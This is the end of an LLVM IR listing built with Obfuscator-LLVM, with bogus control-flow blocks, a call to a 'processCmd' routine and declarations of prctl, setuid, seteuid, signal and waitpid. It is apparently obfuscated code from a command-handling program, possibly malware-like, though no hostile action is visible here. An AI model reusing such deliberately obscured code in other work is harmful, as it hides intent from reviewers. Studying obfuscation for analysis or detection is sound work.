  %704 = sub i64 %703, 1
  %705 = getelementptr inbounds i8, i8* %701, i64 %704
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 13
  br label %originalBB64

originalBB69alteredBB:                            ; preds = %originalBB69, %432
  %709 = load i8*, i8** %15, align 8
  %710 = load i8*, i8** %15, align 8
  %711 = call i64 @strlen(i8* %710) #9
  %_70 = sub i64 0, %711
  %gen71 = add i64 %_70, 1
  %712 = sub i64 %711, 1
  %713 = getelementptr inbounds i8, i8* %709, i64 %712
  store i8 0, i8* %713, align 1
  br label %originalBB69

originalBB75alteredBB:                            ; preds = %originalBB75, %461
  %714 = load i8*, i8** %15, align 8
  %715 = load i8, i8* %714, align 1
  %716 = zext i8 %715 to i32
  %717 = icmp ne i32 %716, 0
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %513
  %718 = load i8*, i8** %21, align 8
  %719 = load i8, i8* %718, align 1
  %720 = zext i8 %719 to i32
  %721 = icmp ne i32 %720, 10
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %559
  %722 = load i32, i32* %20, align 4
  %723 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %722, i8** %723)
  %724 = load i32, i32* %20, align 4
  %725 = icmp sgt i32 %724, 1
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %580
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %601
  %726 = load i32, i32* %22, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %727
  %729 = load i8*, i8** %728, align 8
  call void @free(i8* %729) #5
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %625
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %643
  br label %originalBB99
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146509988}
!2 = !{i32 -2146508860}
!3 = !{i32 -2146508169}
!4 = !{i32 -2146507420}
!5 = !{i32 -2146506481}
!6 = !{i32 -2146505392}
